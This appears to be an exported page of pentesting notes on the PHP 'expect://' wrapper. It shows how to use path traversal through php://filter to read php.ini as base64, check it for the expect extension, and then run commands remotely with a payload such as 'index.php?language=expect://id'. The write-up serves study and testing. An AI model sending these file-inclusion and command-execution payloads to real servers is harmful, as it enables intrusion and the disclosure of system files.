<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Expect Wrapper Attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Expect Wrapper Attack</h1><br/><br /><strong><h3>Expect Wrapper</h3></strong><br />The <a href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper, which allows us to directly run commands through URL streams. <br />Expect Wrapper is very similarly to the web shells used with <a href="st_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--PHP_wrappers--Data_Wrapper_Attack.html">Data</a> and <a href="t_Methodology--WebApp_Pentest--Exploitation--Server-side--File_Inclusion--Remote_Code_Execution_(RCE)--PHP_wrappers--Input_Wrapper_Attack.html">Input</a> wrapper, but don&#39;t need to provide a web shell, as it is designed to execute commands.<br />However, <span style="text-decoration:underline;">Expect is an external wrapper</span>, so it needs <span style="text-decoration:underline;">to be manually installed and enabled on the back-end server</span>,  so we may find it in specific cases. <br /><br /><strong>1. Read PHP Configurations through “</strong><a href="tation--Server-side--File_Inclusion--Local_File_Inclusion(LFI)_File_Disclosure--PHP_Filters_(PHP_Wrappers)--2._PHP_Source_Code_Disclosure.html">PHP Source Code Disclosure</a><strong>”</strong><br />Server Configuration wordlist for linux: <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux</a> that include also PHP configurations file.<br />• To get only php.ini files:<br />    <div class="codebox"><pre>wget https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux; cat LFI-WordList-Linux | grep &#39;php.ini&#39;</pre></div><br />    <div class="codebox"><pre>/apache/php/php.ini<br />/bin/php.ini<br />/etc/httpd/php.ini<br />/etc/php.ini<br />/etc/php/apache/php.ini<br />/etc/php/apache2/php.ini<br />/etc/php/cgi/php.ini<br />/etc/php/php.ini<br />/etc/php/php4/php.ini<br />/etc/php4.4/fcgi/php.ini<br />/etc/php4/apache/php.ini<br />/etc/php4/apache2/php.ini<br />/etc/php4/cgi/php.ini<br />/etc/php5/apache/php.ini<br />/etc/php5/apache2/php.ini<br />/etc/php5/cgi/php.ini<br />/home/bin/stable/apache/php.ini<br />/home2/bin/stable/apache/php.ini<br />/NetServer/bin/stable/apache/php.ini<br />/opt/xampp/etc/php.ini<br />/php/php.ini<br />/php4/php.ini<br />/php5/php.ini<br />/usr/lib/php.ini<br />/usr/lib/php/php.ini<br />/usr/local/apache/conf/php.ini<br />/usr/local/etc/php.ini<br />/usr/local/lib/php.ini<br />/usr/local/php/lib/php.ini<br />/usr/local/php4/lib/php.ini<br />/usr/local/php5/lib/php.ini<br />/usr/local/psa/admin/conf/php.ini<br />/usr/local/Zend/etc/php.ini<br />/var/local/www/conf/php.ini<br />/web/conf/php.ini<br /></pre></div><br />• PHP configurations file can be found in:<br />   ◇ Apache → /etc/php/X.Y/apache2/php.ini<br />   ◇ Nginx → /etc/php/X.Y/fpm/php.ini<br />	*where X.Y is the PHP version of the webapp<br />    where the PHP version available are:<br />	<div class="codebox"><pre>8.1<br />8.0<br />7.4<br />7.3<br />7.2<br />7.1<br />7.0<br />5.6<br />5.5<br />5.4<br />5.3<br />5.2<br />5.1<br />5.0<br />4.4<br />4.3<br />4.2<br />4.1<br />4.0</pre></div><br />Since .ini files are similar to PHP files we can use the same method used in <a href="tation--Server-side--File_Inclusion--Local_File_Inclusion(LFI)_File_Disclosure--PHP_Filters_(PHP_Wrappers)--2._PHP_Source_Code_Disclosure.html">PHP Source Code Disclosure</a><br /><div class="codebox"><pre>$ curl <span style="color:#3ad900;font-weight:400">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span></pre></div><br />Once we have the base64 encoded string, we can decode it and <span style="text-decoration:underline;">grep</span> for <code>expect</code> (NOT <span style="text-decoration:underline;">INSTALLED</span> by default) and we should get:<br /><div class="codebox"><pre>echo <span style="color:#3ad900;font-weight:400">&#39;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#39;</span> | base64 -d | grep expect</pre></div><br />OR<br /><div class="codebox"><pre>cat encoded.txt | base64 -d | grep -E &#39;allow_url_include|expect&#39;</pre></div><br />	<code>extension=expect</code><br />	<a href=""><img src="images/2354-1.png" alt="images/2354-1.png" /></a><br />This mean that the <code>extension</code> configuration keyword is used to enable the <code>expect</code> module<br /><br /><strong>2. Remote Code Execution</strong><br />To use the expect module, we can use the <code>expect://</code> wrapper and then pass the command we want to execute, as follows:<br /><div class="codebox"><pre>$ curl -s <span style="color:#3ad900;font-weight:400">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</span></pre></div><code><br /></code>Executing commands through the <code>expect</code> module is fairly straightforward, as this module was designed for command execution,<br />It is also possible use <code>expect</code> module with XXE vulnerabilities<br /><br /><br /></div>
</body>
</html>
